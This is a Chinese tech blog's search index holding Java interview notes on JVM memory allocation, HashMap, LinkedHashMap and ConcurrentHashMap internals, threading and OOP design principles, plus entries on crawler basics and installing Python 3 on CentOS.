<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[newObject]]></title>
    <url>%2F2018%2F07%2F09%2FJava%2FInterview%2FJava-Interview%2FnewObject%2F</url>
    <content type="text"><![CDATA[对象的创建与内存分配创建对象当 JVM 收到一个 new 指令时，会检查指令中的参数在常量池是否有这个符号的引用，还会检查该类是否已经被加载过了，如果没有的话则要进行一次类加载。 接着就是分配内存了，通常有两种方式： 指针碰撞 空闲列表 使用指针碰撞的前提是堆内存是完全工整的，用过的内存和没用的内存各在一边每次分配的时候只需要将指针向空闲内存一方移动一段和内存大小相等区域即可。 当堆中已经使用的内存和未使用的内存互相交错时，指针碰撞的方式就行不通了，这时就需要采用空闲列表的方式。虚拟机会维护一个空闲的列表，用于记录哪些内存是可以进行分配的，分配时直接从可用内存中直接分配即可。 堆中的内存是否工整是有垃圾收集器来决定的，如果带有压缩功能的垃圾收集器就是采用指针碰撞的方式来进行内存分配的。 分配内存时也会出现并发问题: 这样可以在创建对象的时候使用 CAS 这样的乐观锁来保证。 也可以将内存分配安排在每个线程独有的空间进行，每个线程首先在堆内存中分配一小块内存，称为本地分配缓存(TLAB : Thread Local Allocation Buffer)。 分配内存时，只需要在自己的分配缓存中分配即可，由于这个内存区域是线程私有的，所以不会出现并发问题。 可以使用 -XX:+/-UseTLAB 参数来设定 JVM 是否开启 TLAB 。 内存分配之后需要对该对象进行设置，如对象头。对象头的一些应用可以查看 Synchronize 关键字原理。 对象访问一个对象被创建之后自然是为了使用，在 Java 中是通过栈来引用堆内存中的对象来进行操作的。 对于我们常用的 HotSpot 虚拟机来说，这样引用关系是通过直接指针来关联的。 如图: 这样的好处就是：在 Java 里进行频繁的对象访问可以提升访问速度(相对于使用句柄池来说)。 内存分配Eden 区分配简单的来说对象都是在堆内存中分配的，往细一点看则是优先在 Eden 区分配。 这里就涉及到堆内存的划分了，为了方便垃圾回收，JVM 将堆内存分为新生代和老年代。 而新生代中又会划分为 Eden 区，from Survivor、to Survivor 区。 其中 Eden 和 Survivor 区的比例默认是 8:1:1，当然也支持参数调整 -XX:SurvivorRatio=8。 当在 Eden 区分配内存不足时，则会发生 minorGC ，由于 Java 对象多数是朝生夕灭的特性，所以 minorGC 通常会比较频繁，效率也比较高。 当发生 minorGC 时，JVM 会根据复制算法将存活的对象拷贝到另一个未使用的 Survivor 区，如果 Survivor 区内存不足时，则会使用分配担保策略将对象移动到老年代中。 谈到 minorGC 时，就不得不提到 fullGC(majorGC) ，这是指发生在老年代的 GC ，不论是效率还是速度都比 minorGC 慢的多，回收时还会发生 stop the world 使程序发生停顿，所以应当尽量避免发生 fullGC 。 老年代分配也有一些情况会导致对象直接在老年代分配，比如当分配一个大对象时(大的数组，很长的字符串)，由于 Eden 区没有足够大的连续空间来分配时，会导致提前触发一次 GC，所以尽量别频繁的创建大对象。 因此 JVM 会根据一个阈值来判断大于该阈值对象直接分配到老年代，这样可以避免在新生代频繁的发生 GC。 对于一些在新生代的老对象 JVM 也会根据某种机制移动到老年代中。 JVM 是根据记录对象年龄的方式来判断该对象是否应该移动到老年代，根据新生代的复制算法，当一个对象被移动到 Survivor 区之后 JVM 就给该对象的年龄记为1，每当熬过一次 minorGC 后对象的年龄就 +1 ，直到达到阈值(默认为15)就移动到老年代中。 可以使用 -XX:MaxTenuringThreshold=15 来配置这个阈值。 总结虽说这些内容略显枯燥，但当应用发生不正常的 GC 时，可以方便更快的定位问题。]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LinkedHashMap]]></title>
    <url>%2F2018%2F07%2F09%2FJava%2FInterview%2FJava-Interview%2Fcollection%2FLinkedHashMap%2F</url>
    <content type="text"><![CDATA[LinkedHashMap 底层分析众所周知 HashMap 是一个无序的 Map，因为每次根据 key 的 hashcode 映射到 Entry 数组上，所以遍历出来的顺序并不是写入的顺序。 因此 JDK 推出一个基于 HashMap 但具有顺序的 LinkedHashMap 来解决有排序需求的场景。 它的底层是继承于 HashMap 实现的，由一个双向链表所构成。 LinkedHashMap 的排序方式有两种： 根据写入顺序排序。 根据访问顺序排序。 其中根据访问顺序排序时，每次 get 都会将访问的值移动到链表末尾，这样重复操作就能得到一个按照访问顺序排序的链表。 数据结构1234567891011@Testpublic void test()&#123; Map&lt;String, Integer&gt; map = new LinkedHashMap&lt;String, Integer&gt;(); map.put("1",1) ; map.put("2",2) ; map.put("3",3) ; map.put("4",4) ; map.put("5",5) ; System.out.println(map.toString());&#125; 调试可以看到 map 的组成： 打开源码可以看到： 123456789101112131415161718192021/** * The head of the doubly linked list. */private transient Entry&lt;K,V&gt; header;/** * The iteration ordering method for this linked hash map: &lt;tt&gt;true&lt;/tt&gt; * for access-order, &lt;tt&gt;false&lt;/tt&gt; for insertion-order. * * @serial */private final boolean accessOrder;private static class Entry&lt;K,V&gt; extends HashMap.Entry&lt;K,V&gt; &#123; // These fields comprise the doubly linked list used for iteration. Entry&lt;K,V&gt; before, after; Entry(int hash, K key, V value, HashMap.Entry&lt;K,V&gt; next) &#123; super(hash, key, value, next); &#125;&#125; 其中 Entry 继承于 HashMap 的 Entry，并新增了上下节点的指针，也就形成了双向链表。 还有一个 header 的成员变量，是这个双向链表的头结点。 上边的 demo 总结成一张图如下： 第一个类似于 HashMap 的结构，利用 Entry 中的 next 指针进行关联。 下边则是 LinkedHashMap 如何达到有序的关键。 就是利用了头节点和其余的各个节点之间通过 Entry 中的 after 和 before 指针进行关联。 其中还有一个 accessOrder 成员变量，默认是 false，默认按照插入顺序排序，为 true 时按照访问顺序排序，也可以调用: 123456public LinkedHashMap(int initialCapacity, float loadFactor, boolean accessOrder) &#123; super(initialCapacity, loadFactor); this.accessOrder = accessOrder;&#125; 这个构造方法可以显示的传入 accessOrder。 构造方法LinkedHashMap 的构造方法: 1234public LinkedHashMap() &#123; super(); accessOrder = false;&#125; 其实就是调用的 HashMap 的构造方法: HashMap 实现： 123456789101112131415public HashMap(int initialCapacity, float loadFactor) &#123; if (initialCapacity &lt; 0) throw new IllegalArgumentException("Illegal initial capacity: " + initialCapacity); if (initialCapacity &gt; MAXIMUM_CAPACITY) initialCapacity = MAXIMUM_CAPACITY; if (loadFactor &lt;= 0 || Float.isNaN(loadFactor)) throw new IllegalArgumentException("Illegal load factor: " + loadFactor); this.loadFactor = loadFactor; threshold = initialCapacity; //HashMap 只是定义了改方法，具体实现交给了 LinkedHashMap init();&#125; 可以看到里面有一个空的 init()，具体是由 LinkedHashMap 来实现的： 12345@Overridevoid init() &#123; header = new Entry&lt;&gt;(-1, null, null, null); header.before = header.after = header;&#125; 其实也就是对 header 进行了初始化。 put() 方法看 LinkedHashMap 的 put() 方法之前先看看 HashMap 的 put 方法： 123456789101112131415161718192021222324252627282930313233343536373839404142public V put(K key, V value) &#123; if (table == EMPTY_TABLE) &#123; inflateTable(threshold); &#125; if (key == null) return putForNullKey(value); int hash = hash(key); int i = indexFor(hash, table.length); for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) &#123; Object k; if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123; V oldValue = e.value; e.value = value; //空实现，交给 LinkedHashMap 自己实现 e.recordAccess(this); return oldValue; &#125; &#125; modCount++; // LinkedHashMap 对其重写 addEntry(hash, key, value, i); return null;&#125;// LinkedHashMap 对其重写void addEntry(int hash, K key, V value, int bucketIndex) &#123; if ((size &gt;= threshold) &amp;&amp; (null != table[bucketIndex])) &#123; resize(2 * table.length); hash = (null != key) ? hash(key) : 0; bucketIndex = indexFor(hash, table.length); &#125; createEntry(hash, key, value, bucketIndex);&#125;// LinkedHashMap 对其重写void createEntry(int hash, K key, V value, int bucketIndex) &#123; Entry&lt;K,V&gt; e = table[bucketIndex]; table[bucketIndex] = new Entry&lt;&gt;(hash, key, value, e); size++;&#125; 主体的实现都是借助于 HashMap 来完成的，只是对其中的 recordAccess(), addEntry(), createEntry() 进行了重写。 LinkedHashMap 的实现： 1234567891011121314151617181920212223242526272829303132333435363738 //就是判断是否是根据访问顺序排序，如果是则需要将当前这个 Entry 移动到链表的末尾 void recordAccess(HashMap&lt;K,V&gt; m) &#123; LinkedHashMap&lt;K,V&gt; lm = (LinkedHashMap&lt;K,V&gt;)m; if (lm.accessOrder) &#123; lm.modCount++; remove(); addBefore(lm.header); &#125; &#125; //调用了 HashMap 的实现，并判断是否需要删除最少使用的 Entry(默认不删除) void addEntry(int hash, K key, V value, int bucketIndex) &#123; super.addEntry(hash, key, value, bucketIndex); // Remove eldest entry if instructed Entry&lt;K,V&gt; eldest = header.after; if (removeEldestEntry(eldest)) &#123; removeEntryForKey(eldest.key); &#125;&#125;void createEntry(int hash, K key, V value, int bucketIndex) &#123; HashMap.Entry&lt;K,V&gt; old = table[bucketIndex]; Entry&lt;K,V&gt; e = new Entry&lt;&gt;(hash, key, value, old); //就多了这一步，将新增的 Entry 加入到 header 双向链表中 table[bucketIndex] = e; e.addBefore(header); size++;&#125; //写入到双向链表中 private void addBefore(Entry&lt;K,V&gt; existingEntry) &#123; after = existingEntry; before = existingEntry.before; before.after = this; after.before = this; &#125; get 方法LinkedHashMap 的 get() 方法也重写了： 123456789101112131415161718192021public V get(Object key) &#123; Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)getEntry(key); if (e == null) return null; //多了一个判断是否是按照访问顺序排序，是则将当前的 Entry 移动到链表头部。 e.recordAccess(this); return e.value;&#125;void recordAccess(HashMap&lt;K,V&gt; m) &#123; LinkedHashMap&lt;K,V&gt; lm = (LinkedHashMap&lt;K,V&gt;)m; if (lm.accessOrder) &#123; lm.modCount++; //删除 remove(); //添加到头部 addBefore(lm.header); &#125;&#125; clear() 清空就要比较简单了： 12345//只需要把指针都指向自己即可，原本那些 Entry 没有引用之后就会被 JVM 自动回收。public void clear() &#123; super.clear(); header.before = header.after = header;&#125; 总结总的来说 LinkedHashMap 其实就是对 HashMap 进行了拓展，使用了双向链表来保证了顺序性。 因为是继承与 HashMap 的，所以一些 HashMap 存在的问题 LinkedHashMap 也会存在，比如不支持并发等。]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Thread-common-problem]]></title>
    <url>%2F2018%2F07%2F09%2FJava%2FInterview%2FJava-Interview%2FThread-common-problem%2F</url>
    <content type="text"><![CDATA[Java 多线程常见问题上下文切换多线程并不一定是要在多核处理器才支持的，就算是单核也是可以支持多线程的。CPU 通过给每个线程分配一定的时间片，由于时间非常短通常是几十毫秒，所以 CPU 可以不停的切换线程执行任务从而达到了多线程的效果。 但是由于在线程切换的时候需要保存本次执行的信息(详见)，在该线程被 CPU 剥夺时间片后又再次运行恢复上次所保存的信息的过程就成为上下文切换。 上下文切换是非常耗效率的。 通常有以下解决方案: 采用无锁编程，比如将数据按照 Hash(id) 进行取模分段，每个线程处理各自分段的数据，从而避免使用锁。 采用 CAS(compare and swap) 算法，如 Atomic 包就是采用 CAS 算法(详见)。 合理的创建线程，避免创建了一些线程但其中大部分都是出于 waiting 状态，因为每当从 waiting 状态切换到 running 状态都是一次上下文切换。 死锁死锁的场景一般是：线程 A 和线程 B 都在互相等待对方释放锁，或者是其中某个线程在释放锁的时候出现异常如死循环之类的。这时就会导致系统不可用。 常用的解决方案如下： 尽量一个线程只获取一个锁。 一个线程只占用一个资源。 尝试使用定时锁，至少能保证锁最终会被释放。 资源限制当在带宽有限的情况下一个线程下载某个资源需要 1M/S,当开 10 个线程时速度并不会乘 10 倍，反而还会增加时间，毕竟上下文切换比较耗时。 如果是受限于资源的话可以采用集群来处理任务，不同的机器来处理不同的数据，就类似于开始提到的无锁编程。]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HashMap]]></title>
    <url>%2F2018%2F07%2F09%2FJava%2FInterview%2FJava-Interview%2FHashMap%2F</url>
    <content type="text"><![CDATA[HashMap 底层分析 以下基于 JDK1.7 分析。 如图所示，HashMap 底层是基于数组和链表实现的。其中有两个重要的参数： 容量 负载因子 容量的默认大小是 16，负载因子是 0.75，当 HashMap 的 size &gt; 16*0.75 时就会发生扩容(容量和负载因子都可以自由调整)。 put 方法首先会将传入的 Key 做 hash 运算计算出 hashcode,然后根据数组长度取模计算出在数组中的 index 下标。 由于在计算中位运算比取模运算效率高的多，所以 HashMap 规定数组的长度为 2&lt;sup&gt;n 。这样用 2&lt;/sup&gt;n - 1 做位运算与取模效果一致，并且效率还要高出许多。 由于数组的长度有限，所以难免会出现不同的 Key 通过运算得到的 index 相同，这种情况可以利用链表来解决，HashMap 会在 table[index]处形成链表，采用头插法将数据插入到链表中。 get 方法get 和 put 类似，也是将传入的 Key 计算出 index ，如果该位置上是一个链表就需要遍历整个链表，通过 key.equals(k) 来找到对应的元素。 遍历方式12345Iterator&lt;Map.Entry&lt;String, Integer&gt;&gt; entryIterator = map.entrySet().iterator(); while (entryIterator.hasNext()) &#123; Map.Entry&lt;String, Integer&gt; next = entryIterator.next(); System.out.println("key=" + next.getKey() + " value=" + next.getValue()); &#125; 123456Iterator&lt;String&gt; iterator = map.keySet().iterator(); while (iterator.hasNext())&#123; String key = iterator.next(); System.out.println("key=" + key + " value=" + map.get(key)); &#125; 123map.forEach((key,value)-&gt;&#123; System.out.println("key=" + key + " value=" + value);&#125;); 强烈建议使用第一种 EntrySet 进行遍历。 第一种可以把 key value 同时取出，第二种还得需要通过 key 取一次 value，效率较低, 第三种需要 JDK1.8 以上，通过外层遍历 table，内层遍历链表或红黑树。 notice在并发环境下使用 HashMap 容易出现死循环。 并发场景发生扩容，调用 resize() 方法里的 rehash() 时，容易出现环形链表。这样当获取一个不存在的 key 时，计算出的 index 正好是环形链表的下标时就会出现死循环。 所以 HashMap 只能在单线程中使用，并且尽量的预设容量，尽可能的减少扩容。 在 JDK1.8 中对 HashMap 进行了优化：当 hash 碰撞之后写入链表的长度超过了阈值(默认为8)，链表将会转换为红黑树。 假设 hash 冲突非常严重，一个数组后面接了很长的链表，此时重新的时间复杂度就是 O(n) 。 如果是红黑树，时间复杂度就是 O(logn) 。 大大提高了查询效率。 多线程场景下推荐使用 ConcurrentHashMap。]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ConcurrentHashMap]]></title>
    <url>%2F2018%2F07%2F09%2FJava%2FInterview%2FJava-Interview%2FConcurrentHashMap%2F</url>
    <content type="text"><![CDATA[ConcurrentHashMap 实现原理由于 HashMap 是一个线程不安全的容器，主要体现在容量大于总量*负载因子发生扩容时会出现环形链表从而导致死循环。 因此需要支持线程安全的并发容器 ConcurrentHashMap 。 数据结构 如图所示，是由 Segment 数组、HashEntry 数组组成，和 HashMap 一样，仍然是数组加链表组成。 ConcurrentHashMap 采用了分段锁技术，其中 Segment 继承于 ReentrantLock。不会像 HashTable 那样不管是 put 还是 get 操作都需要做同步处理，理论上 ConcurrentHashMap 支持 CurrencyLevel (Segment 数组数量)的线程并发。每当一个线程占用锁访问一个 Segment 时，不会影响到其他的 Segment。 get 方法ConcurrentHashMap 的 get 方法是非常高效的，因为整个过程都不需要加锁。 只需要将 Key 通过 Hash 之后定位到具体的 Segment ，再通过一次 Hash 定位到具体的元素上。由于 HashEntry 中的 value 属性是用 volatile 关键词修饰的，保证了内存可见性，所以每次获取时都是最新值(volatile 相关知识点)。 put 方法内部 HashEntry 类 ：12345678910111213static final class HashEntry&lt;K,V&gt; &#123; final int hash; final K key; volatile V value; volatile HashEntry&lt;K,V&gt; next; HashEntry(int hash, K key, V value, HashEntry&lt;K,V&gt; next) &#123; this.hash = hash; this.key = key; this.value = value; this.next = next; &#125;&#125; 虽然 HashEntry 中的 value 是用 volatile 关键词修饰的，但是并不能保证并发的原子性，所以 put 操作时仍然需要加锁处理。 首先也是通过 Key 的 Hash 定位到具体的 Segment，在 put 之前会进行一次扩容校验。这里比 HashMap 要好的一点是：HashMap 是插入元素之后再看是否需要扩容，有可能扩容之后后续就没有插入就浪费了本次扩容(扩容非常消耗性能)。 而 ConcurrentHashMap 不一样，它是先将数据插入之后再检查是否需要扩容，之后再做插入。 size 方法每个 Segment 都有一个 volatile 修饰的全局变量 count ,求整个 ConcurrentHashMap 的 size 时很明显就是将所有的 count 累加即可。但是 volatile 修饰的变量却不能保证多线程的原子性，所有直接累加很容易出现并发问题。 但如果每次调用 size 方法将其余的修改操作加锁效率也很低。所以做法是先尝试两次将 count 累加，如果容器的 count 发生了变化再加锁来统计 size。 至于 ConcurrentHashMap 是如何知道在统计时大小发生了变化呢，每个 Segment 都有一个 modCount 变量，每当进行一次 put remove 等操作，modCount 将会 +1。只要 modCount 发生了变化就认为容器的大小也在发生变化。 以上内容 base JDK1.7，1.8 的实现更加复杂但是原理类似，建议在 1.7 的基础上查看源码。]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[爬虫的简单入门]]></title>
    <url>%2F2018%2F07%2F06%2FPython%2F%E7%88%AC%E8%99%AB%E7%9A%84%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[1.数据来源 业务库 日志数据 公共数据 购买 – 倒卖 – 有法律风险 2.爬虫工程师技能清单 python编程语言基础 HTTP协议 html,css,javascript基本web技能 mysql/mongodb/redis等存储系统 scrapy/pyspider/django 抓包工具和网页分析工具(正则，bs4，xpath，selenuim) json/csv/db 3.Python3基础内容廖雪峰Python3教程(文档)菜鸟教程Python3教程(文档) python编程语言简单介绍（产生背景，优缺点，流行度）python的开发环境搭建（linux，windows，python，pycharm）python的hello worldpython关键字查看python的变量定义python的数据类型（Number String List Tuple Set Dict）python的注释（单行和段落）python的输入输出（print 和 input）python数据类型转换/常用数值运算/类型判断python的集合，列表，元组，字典python的流程控制for和while和if（break， continue， pass）python的切片python的代码缩进（换行，段落）python函数（自定义函数，常用内置模块，常用函数，函数调用）python异常python模块（内置模块，导入模块，自定义模块）python迭代器和生成器python面向对象python读写文件IOpython数据库和JSON和CSV 3.1 基本语法记录1234567891011121314# 同时遍历2个长度相同的 listfor i in range(len(companys)): print(companys[i] + "," + fincs[i]) jobs # 工作岗位companys #公司名mmoneys # 薪资edus # 学历exps # 经验cmptypes # 公司类型fincs # 融资状态true_tags #job 标签c_b_s # 公司优势 4.搜索引擎基本工作原理 5.]]></content>
      <categories>
        <category>Hadoop</category>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>技术</tag>
        <tag>Hadoop</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CentOS6.x下Python3的安装]]></title>
    <url>%2F2018%2F07%2F05%2FPython%2FCentOS6.x%E4%B8%8BPython3%E7%9A%84%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[python-3.6.4在centos-6.7安装： 详细步骤： 1、安装一些依赖的软件包yum -y groupinstall “Development tools”yum -y install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gdbm-devel db4-devel libpcap-devel xz-develyum -y install yum-plugin-remove-with-leaves 2、下载Python3.6的源码包并编译（在/usr/local目录下）wget https://www.python.org/ftp/python/3.6.4/Python-3.6.4.tgztar -vxf Python-3.6.4.tgz -C ~/appscd Python-3.6.4mkdir /usr/local/python3./configure –prefix=/usr/local/python3 –enable-shared –enable-optimizationsmakemake install 3、把新安装的python3.6拷贝到/usr/bin/目录下cp /usr/local/python3/bin/python3.6 /usr/bin/python3.6然后新建快捷方式：ln -s /usr/bin/python3.6 /usr/bin/python3 4、一步操作：echo /usr/local/python3/lib/ &gt;&gt; /etc/ld.so.conf.d/local.confldconfig 5、验证安装是否成功/usr/bin/python3 –version 6、配置环境变量vim /etc/profileexport PYTHON_HOME=/usr/local/python3export PATH=$PATH:$PYTHON_HOME/binsource /etc/profile 7、尝试安装一个模块pip3 install beautifulsoup4 8、修改pip源：mkdir ~/.pipcd ~/.pipvi pip.conf[global]trusted-host = pypi.douban.comindex-url = http://pypi.douban.com/simple 9、安装numpypip3 install numpy]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>技术</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[面向对象思想]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3%2F</url>
    <content type="text"><![CDATA[一、三大特性 封装 继承 多态 二、类图 泛化关系 (Generalization) 实现关系 (Realization) 聚合关系 (Aggregation) 组合关系 (Composition) 关联关系 (Association) 依赖关系 (Dependency) 三、设计原则 S.O.L.I.D 其他常见原则 参考资料 一、三大特性封装利用抽象数据类型将数据和基于数据的操作封装在一起，使其构成一个不可分割的独立实体。数据被保护在抽象数据类型的内部，尽可能地隐藏内部的细节，只保留一些对外接口使之与外部发生联系。用户无需知道对象内部的细节，但可以通过对象对外提供的接口来访问该对象。 优点： 减少耦合：可以独立地开发、测试、优化、使用、理解和修改 减轻维护的负担：可以更容易被程序员理解，并且在调试的时候可以不影响其他模块 有效地调节性能：可以通过剖析确定哪些模块影响了系统的性能 提高软件的可重用性 降低了构建大型系统的风险：即使整个系统不可用，但是这些独立的模块却有可能是可用的 以下 Person 类封装 name、gender、age 等属性，外界只能通过 get() 方法获取一个 Person 对象的 name 属性和 gender 属性，而无法获取 age 属性，但是 age 属性可以供 work() 方法使用。 注意到 gender 属性使用 int 数据类型进行存储，封装使得用户注意不到这种实现细节。并且在需要修改 gender 属性使用的数据类型时，也可以在不影响客户端代码的情况下进行。 123456789101112131415161718192021public class Person &#123; private String name; private int gender; private int age; public String getName() &#123; return name; &#125; public String getGender() &#123; return gender == 0 ? "man" : "woman"; &#125; public void work() &#123; if (18 &lt;= age &amp;&amp; age &lt;= 50) &#123; System.out.println(name + " is working very hard!"); &#125; else &#123; System.out.println(name + " can't work any more!"); &#125; &#125;&#125; 继承继承实现了 IS-A 关系，例如 Cat 和 Animal 就是一种 IS-A 关系，因此 Cat 可以继承自 Animal，从而获得 Animal 非 private 的属性和方法。 Cat 可以当做 Animal 来使用，也就是说可以使用 Animal 引用 Cat 对象。父类引用指向子类对象称为 向上转型 。 1Animal animal = new Cat(); 继承应该遵循里氏替换原则，子类对象必须能够替换掉所有父类对象。 多态多态分为编译时多态和运行时多态。编译时多态主要指方法的重载，运行时多态指程序中定义的对象引用所指向的具体类型在运行期间才确定。 运行时多态有三个条件： 继承 覆盖（重写） 向上转型 下面的代码中，乐器类（Instrument）有两个子类：Wind 和 Percussion，它们都覆盖了父类的 play() 方法，并且在 main() 方法中使用父类 Instrument 来引用 Wind 和 Percussion 对象。在 Instrument 引用调用 play() 方法时，会执行实际引用对象所在类的 play() 方法，而不是 Instrument 类的方法。 12345678910111213141516171819202122232425262728public class Instrument &#123; public void play() &#123; System.out.println("Instument is playing..."); &#125;&#125;public class Wind extends Instrument &#123; public void play() &#123; System.out.println("Wind is playing..."); &#125;&#125;public class Percussion extends Instrument &#123; public void play() &#123; System.out.println("Percussion is playing..."); &#125;&#125;public class Music &#123; public static void main(String[] args) &#123; List&lt;Instrument&gt; instruments = new ArrayList&lt;&gt;(); instruments.add(new Wind()); instruments.add(new Percussion()); for(Instrument instrument : instruments) &#123; instrument.play(); &#125; &#125;&#125; 二、类图以下类图使用 PlantUML 绘制，更多语法及使用请参考：http://plantuml.com/ 泛化关系 (Generalization)用来描述继承关系，在 Java 中使用 extends 关键字。 123456789101112@startumltitle Generalizationclass Vihicalclass Carclass TrunckVihical &lt;|-- CarVihical &lt;|-- Trunck@enduml 实现关系 (Realization)用来实现一个接口，在 Java 中使用 implement 关键字。 123456789101112@startumltitle Realizationinterface MoveBehaviorclass Flyclass RunMoveBehavior &lt;|.. FlyMoveBehavior &lt;|.. Run@enduml 聚合关系 (Aggregation)表示整体由部分组成，但是整体和部分不是强依赖的，整体不存在了部分还是会存在。 1234567891011121314@startumltitle Aggregationclass Computerclass Keyboardclass Mouseclass ScreenComputer o-- KeyboardComputer o-- MouseComputer o-- Screen@enduml 组合关系 (Composition)和聚合不同，组合中整体和部分是强依赖的，整体不存在了部分也不存在了。比如公司和部门，公司没了部门就不存在了。但是公司和员工就属于聚合关系了，因为公司没了员工还在。 123456789101112@startumltitle Compositionclass Companyclass DepartmentAclass DepartmentBCompany *-- DepartmentACompany *-- DepartmentB@enduml 关联关系 (Association)表示不同类对象之间有关联，这是一种静态关系，与运行过程的状态无关，在最开始就可以确定。因此也可以用 1 对 1、多对 1、多对多这种关联关系来表示。比如学生和学校就是一种关联关系，一个学校可以有很多学生，但是一个学生只属于一个学校，因此这是一种多对一的关系，在运行开始之前就可以确定。 12345678910@startumltitle Associationclass Schoolclass StudentSchool &quot;1&quot; - &quot;n&quot; Student@enduml 依赖关系 (Dependency)和关联关系不同的是，依赖关系是在运行过程中起作用的。A 类和 B 类是依赖关系主要有三种形式： A 类是 B 类中的（某中方法的）局部变量； A 类是 B 类方法当中的一个参数； A 类向 B 类发送消息，从而影响 B 类发生变化； 12345678910111213141516171819@startumltitle Dependencyclass Vihicle &#123; move(MoveBehavior)&#125;interface MoveBehavior &#123; move()&#125;note &quot;MoveBehavior.move()&quot; as NVihicle ..&gt; MoveBehaviorVihicle .. N@enduml 三、设计原则S.O.L.I.D 简写 全拼 中文翻译 SRP The Single Responsibility Principle 单一责任原则 OCP The Open Closed Principle 开放封闭原则 LSP The Liskov Substitution Principle 里氏替换原则 ISP The Interface Segregation Principle 接口分离原则 DIP The Dependency Inversion Principle 依赖倒置原则 1. 单一责任原则 修改一个类的原因应该只有一个。 换句话说就是让一个类只负责一件事，当这个类需要做过多事情的时候，就需要分解这个类。 如果一个类承担的职责过多，就等于把这些职责耦合在了一起，一个职责的变化可能会削弱这个类完成其它职责的能力。 2. 开放封闭原则 类应该对扩展开放，对修改关闭。 扩展就是添加新功能的意思，因此该原则要求在添加新功能时不需要修改代码。 符合开闭原则最典型的设计模式是装饰者模式，它可以动态地将责任附加到对象上，而不用去修改类的代码。 3. 里氏替换原则 子类对象必须能够替换掉所有父类对象。 继承是一种 IS-A 关系，子类需要能够当成父类来使用，并且需要比父类更特殊。 如果不满足这个原则，那么各个子类的行为上就会有很大差异，增加继承体系的复杂度。 4. 接口分离原则 不应该强迫客户依赖于它们不用的方法。 因此使用多个专门的接口比使用单一的总接口要好。 5. 依赖倒置原则 高层模块不应该依赖于低层模块，二者都应该依赖于抽象；抽象不应该依赖于细节，细节应该依赖于抽象。 高层模块包含一个应用程序中重要的策略选择和业务模块，如果高层模块依赖于低层模块，那么低层模块的改动就会直接影响到高层模块，从而迫使高层模块也需要改动。 依赖于抽象意味着： 任何变量都不应该持有一个指向具体类的指针或者引用； 任何类都不应该从具体类派生； 任何方法都不应该覆写它的任何基类中的已经实现的方法。 其他常见原则除了上述的经典原则，在实际开发中还有下面这些常见的设计原则。 简写 全拼 中文翻译 LOD The Law of Demeter 迪米特法则 CRP The Composite Reuse Principle 合成复用原则 CCP The Common Closure Principle 共同封闭原则 SAP The Stable Abstractions Principle 稳定抽象原则 SDP The Stable Dependencies Principle 稳定依赖原则 1. 迪米特法则迪米特法则又叫作最少知识原则（Least Knowledge Principle，简写 LKP），就是说一个对象应当对其他对象有尽可能少的了解，不和陌生人说话。 2. 合成复用原则尽量使用对象组合，而不是继承来达到复用的目的。 3. 共同封闭原则一起修改的类，应该组合在一起（同一个包里）。如果必须修改应用程序里的代码，我们希望所有的修改都发生在一个包里（修改关闭），而不是遍布在很多包里。 4. 稳定抽象原则最稳定的包应该是最抽象的包，不稳定的包应该是具体的包，即包的抽象程度跟它的稳定性成正比。 5. 稳定依赖原则包之间的依赖关系都应该是稳定方向依赖的，包要依赖的包要比自己更具有稳定性。 参考资料 Java 编程思想 敏捷软件开发：原则、模式与实践 面向对象设计的 SOLID 原则 看懂 UML 类图和时序图 UML 系列——时序图（顺序图）sequence diagram 面向对象编程三大特性 —— 封装、继承、多态]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[重构]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2F%E9%87%8D%E6%9E%84%2F</url>
